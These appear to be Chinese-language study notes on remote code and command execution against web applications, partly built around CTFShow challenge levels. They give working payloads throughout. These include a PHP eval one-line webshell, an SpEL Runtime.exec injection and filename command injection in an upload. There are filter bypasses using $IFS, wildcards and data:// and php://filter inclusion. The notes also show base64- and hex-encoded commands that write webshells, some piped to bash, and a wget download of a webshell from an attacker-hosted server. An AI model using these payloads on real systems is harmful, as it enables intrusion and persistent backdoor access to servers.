# 一句话后门webshell原理

一句话后门说白了就是类似于<php @eval($_post["x"];?>这样的php代码，这串代码成功执行后会让目标把“x"按照php代码执行，而工具的作用就是自动帮我们填充x进行如查看目录等一系列操作

把POST方式提交的x参数的值当做命令进行执行

- 查看值对应的参数

先自己定义一个比较明显的值，如5555555，然后提交到网页，然后F12查看网络，看数据包中的请求体，哪个参数名对应的是5555555

# 分类

RCE分为远程代码执行漏洞与远程命令执行漏洞

### 代码执行

引用脚本代码解析执行

### 命令执行

脚本调用操作系统命令

------

- 实际上代码执行也可以实现命令执行，命令执行也可以实现代码执行

eg:

代码→命令：需存在可调用系统命令的函数或接口。
命令→代码：需具备调用解释器的权限或写入文件的能力。

# 漏洞函数

### PHP

PHP代码执行函数：

eval()、assert()、preg_replace()、create_function()、array_map()、call_user_func()、call_user_func_array()、array_filter()、uasort()、等

PHP命令执行函数：

system()、exec()、shell_exec()、pcntl_exec()、popen()、proc_popen()、passthru()、等

### Python

eval exec subprocess os.system commands等

### Java

Java中没有类似php中eval函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如: OGNL、SpEL、MVEL等.

eg:

一个网站后端采用SpEl解析

提交参数comment=T(java.lang.Runtime).getRuntime().exec('calc')


# 漏洞发现

### 黑盒功能点

系统信息管理面板：进行监控设备/程序情况的的网页，服务器/网站管理面板，服务管理

在线编程

自定义模版

### 白盒代码审计

看代码常见的函数或方法名

### 配合其他漏洞

如配合文件上传，上传图片马实现远程RCE

注入，文件包含，反序列化等引发

##### php文件上传造成rce

文件上传时移动文件采用系统命令进行移动，通过控制该命令来实现rce

该案例的环境是对方服务器采用PHP，实现文件上传功能点的系统函数是move

如正常上传一个文件text.php

对方在后端执行的命令是：

```
move "c:\windows\php127.tmp" "uploads/test.php"
```

现在上传一个文件并抓包修改名字为text.php"&whoami

对方在后端执行的命令是：

```
move "c:\windows\php127.tmp" "uploads/text.php"&whoami"
```

就会执行命令whoami

# 绕过

### 无回显

##### 写文件并访问

直接用命令在远程服务器上写个文件并访问查看：echo123>123.txt

##### 外带dns

在目标服务器上远程执行命令：ping dnslog地址，然后去对应的dnslog地址上查看是否有访问记录

### CTF

##### 过滤cat

more函数

##### 过滤空格

```
$IFS
$IFS$1
${IFS}
$IFS$9
<     比如cat<a.tct:表示cat a.txt
<>
{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来
%20
%09

```

##### 过滤/

使用;拼接多个命令

##### 过滤;

用%0a去替换;

##### 关键字检测

```
flag可以用正则替换f***
flag可以用TAB加*替换，不过要用url编码TAB，表示为%09加*
```

##### windows系统命令拼接方式

“|”:管道符，前面命令标准输出，后面命令的标准输入。例如：help |more
“&” commandA & commandB 先运行命令A，然后运行命令B
“||” commandA || commandB 运行命令A，如果失败则运行命令B
“&&” commandA && commandB 运行命令A，如果成功则运行命令B

- 如果绕过过滤时多次尝试失败时页面显示是否禁止此类弹窗重复出现就说明对方采用的是前端验证

想要绕过前端验证可以选择禁止浏览器的某种语言（比如查看前端源代码得知对方过滤的代码是用js代码写的，就可以在浏览器上设置禁止js语言允许）

或者先输入可以通过的数据，然后抓包，在数据包再修改数据（绕过前端的验证）

- **反引号：**
  主要是用在内部还要嵌套引用一条命令时使用，现在可以直接用$()代替：

  ```
  echo "  $(ls -la  .)"
  输出：当前文件夹中所包含的文件
  ```



[CTF_WEB学习-------------RCE之命令注入_ctf rce漏洞_r1ng_13的博客-CSDN博客](https://blog.csdn.net/qq_45616570/article/details/118739229)

##### 通配符绕过

CTFShow29关

检测关键字flag，使用通配符绕过：

```
system('tac fla*.php');
```

##### 同义函数替换绕过

CTFShow30关

过滤关键字flag,system,php，

```
echo shell_exec('tac fla*.ph*');
```

##### 参数逃逸

CTFShwo31关

过滤参数c，检测参数c的关键字flag,system,php,cat,sort,shell  ,`\.`，空格

```
c = eval($_GET[1]);&1=system('tac flag.php');
```

##### 配合包含&伪协议

CTFShow32-36关

过滤关键字flag,system,php,cat,sort,shell,`\.`，空格,`\'`,`\‘`，echo,`\;` ,`\(`

```
include$_GET[a]?>&a=data://text/plain,<?=system('tac flag.php');?>


include$_GET[a]?>&a=php://filter/read=convert.base64-encode/resource=flag.php
```

# RCE写shell

[命令执行写Webshell总结-CSDN博客](https://blog.csdn.net/hackzkaq/article/details/118934208)

### 1.反弹shell

### 2.在web路径写webshell

前提：知道webshell的绝对路径

#### 如何查找webshell的绝对路径？

**1.文件查找法**
一般web路径一定会有index.html\php\jsp\asp，login.xxx文件。可以根据已知页面文件名全局搜索

linux:

 find / -name index.php 

find / -name index.* 

windows:

 for /r d:/ %i in (index.html) do @echo %i 

for /r d:/ %i in (index.*) do @echo %i

**2.源码查找法**

也可以选择打开当前已知web页面的f12查看源码，寻找一段特征足够明显的源码进行查找

```bash
linux:
find / -name "*.*" | xargs grep "PHP installed properly"
find /var/www/ -name "*.php" | xargs grep "doServerTest()"

windows:
findstr /s/i/n /d:D:\sec_tools\ /c:"html" *.html
findstr /s/i/n /d:C:\windows\ /c:"success" *.*
```



**3.history等**

通过linux历史命令查找web相关的服务启动命令

```bash
history | grep nginx
history | grep tomcat
history | grep http
```

#### 如何写入webshell

**1.echo直接写入**

echo '<?php eval($_POST[1]); ?>' > 1.php

**2.base64写入**

```bash
echo "PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==" | base64 -d >2.php
1
```

使用base64是比较通用的方法，完美去除了webshell本身的特殊字符

**3.绕过重定向符**

```bash
echo "ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA=" | base64 -d | bash
1
echo "ZWNobyAiUEQ5d2FIQWdaWFpoYkNna1gxQlBVMVJiTVYwcE95QS9QZz09IiB8IGJhc2U2NCAtZCA+My5waHA=" | base64 -d | sh
1
```

重定向符>不可用时，我们可以将1或2中的整体命令base64编码

然后解码后通过bash或sh执行

其他字符绕过方式，如空格对应${IFS}等，可参考命令注入的绕过方式 [http://uuzdaisuki.com/2020/07/15/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/](http://uuzdaisuki.com/2020/07/15/命令注入绕过方式总结/)

**4.远端下载webshell**

远端服务器放置webshell,

开启http python -m http.server 

目标机器执行 

wget http://xx.xx.xxx.xx:8000/xxx.php 

可出网且有wget的情况下可采用此方式

**5.hex写入**

hex写入与base64写入相似，在 https://www.107000.com/T-Hex/
将webshell编码成hex，使用xxd命令还原

或在使用前将webshell使用xxd生成hex数据

```bash
echo '<?php eval($_POST[1]); ?>' |xxd -ps
1
```

然后命令注入执行

```bash
echo 3C3F706870206576616C28245F504F53545B315D293B203F3E|xxd -r -ps > 5.php
```

